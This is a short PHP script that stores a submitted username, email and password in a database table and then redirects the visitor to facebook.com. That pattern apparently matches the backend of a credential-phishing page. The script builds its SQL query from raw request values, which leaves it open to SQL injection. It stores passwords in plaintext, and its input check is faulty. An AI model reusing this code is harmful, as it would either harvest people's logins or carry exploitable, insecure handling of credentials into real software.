<?php 

if (isset($_REQUEST['submit'])) {
    $username = $_REQUEST['username'];
    $email = $_REQUEST['email'];
    $pwd = $_REQUEST['pwd'];
    include "connect.php";
    if (!$connect) {
        die ("Connetion Failed!" . mysqli_error($connect));
    }
    if ($username || $email || $pwd != "") {
        $query = "INSERT INTO reg_info (username, email,  pwd) VALUES ('$username', '$email', '$pwd')";
        $result = mysqli_query($connect, $query);
        header("location: http://www.facebook.com");
    } else {
        header("location: account.php");
    }
}

?>
